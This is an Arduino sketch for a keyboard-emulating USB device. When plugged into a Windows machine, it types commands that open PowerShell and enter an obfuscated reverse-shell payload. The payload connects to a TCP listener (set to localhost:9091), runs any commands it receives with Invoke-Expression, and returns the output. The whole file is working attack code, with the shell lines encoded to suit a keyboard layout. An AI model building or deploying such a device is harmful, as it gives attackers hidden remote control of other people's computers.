// l0x539

#include <HID.h>
#include <Keyboard.h>
#include <ctype.h>


bool rec = false;

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  static bool a = true;
  static char cmd[] = "c;d";
  static char t[] = "";
  static char cd[] = "cd \x85.";
  static char ps[] = "pozershell";
  static char payload[] = "]client = Nez6Object Syste;\x85,Net\x85,Sockets\x85,TCPClient53\xFFlocalhost\xFF\x33m\xFF 9091\xFF-,]streq; = ]client\x85,GetStreq;5-, ";
  static char payload1[] = "]c = 4\x86\x35 byte\x86\x35\x86-\x86-]bytes =\xFF 0\x85,\x85,65535\x86\x36\x85'\x86\x34 0\x86=, zhile\xFF 55\xFF]i = ]streq;\x85,\xFFReqd5\xFF]bytesm 0m ]bytes\x85,Length--\xFF 6ne\xFF 0\xFF-\x86\x34,]dqtq = 5Nez6Object 6TypeNq;e Syste;\x85,Text\x85,QSCIIEncoding-\x85,GetString5]bytesm\xFF 0m ]i-,]sendbqck =\xFF 5\xFFiex ]dqtq\xFF \xFF\x32\xFF\x34 \x85= \x86\x35 CHQR\x86-\x86\x35 BYTE\x86-\xFF\x30x3E\xFF \x85= 4\x31\xFF\x31\xFF \x86\x36 Out6String-,]sendbqck\xFF\x32\xFF = ]sendbqck \x85= 3PS 3 \x85= 5pzd-\x85,Pqth \x85= 3\x85 \x34 \x85= \x86\x35 CHQR\x86-\x86\x35 BYTE\x86-\xFF\x30x3E\xFF \x85= 4 3,]sendbyte = 5\x86\x35text\x85,encoding\x86-..QSCII-\x85,GetBytes5]sendbqck\xFF\x32\xFF-,]streq;\x85,Zrite\x35]sendbytem \xFF\x30\xFFm ]sendbyte\x85,Length-,]streq;\x85,Flush5-\x86=4,Invoke6Expression ]c";
  static char newLine[] = "\r\n";
  
  if (a) {
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    delay(50);
    Keyboard.press('r');
    delay(500);
    Keyboard.releaseAll();
    typeStringIn(cmd);
    typeStringIn(newLine);
    delay(3000);
    typeStringIn(cd);
    typeStringIn(newLine);
    delay(300);
    typeStringIn(ps);
    typeStringIn(newLine);
    delay(300);
    typeStringIn(payload);
    typeStringIn(newLine); 
    delay(100);
    typeStringIn(payload1);
    typeStringIn(newLine);       
    
  }
  a = false;
}

void typeStringIn(char* str) {
    for (int i=0; i < strlen(str); i++) {
      if (str[i] == '\xFF') {
        rec = rec?false:true;
      } else if (str[i] == '\x85' || str[i] == '\x86') {
        hotKeyHere(str[i], str[i+1]);
        i++;
      } else if (rec && isDigit(str[i])) {
        Keyboard.press(KEY_RIGHT_SHIFT);
        delay(5);
        Keyboard.press(str[i]);
        Keyboard.releaseAll(); 
      } else {
        Keyboard.press(str[i]);
        delay(5);
        Keyboard.releaseAll(); 
      }
    }
    rec=false;
}

void TestTypeStringIn(char* str) {
    for (int i=0; i < strlen(str); i++) {
      
        Keyboard.press(str[i]);
        delay(50);
        Keyboard.releaseAll(); 

    }
    rec=false;
}

void hotKeyHere(char a, char b) {
  Keyboard.press(a);
  delay(5);
  Keyboard.press(b);
  delay(2);
  Keyboard.releaseAll();
}
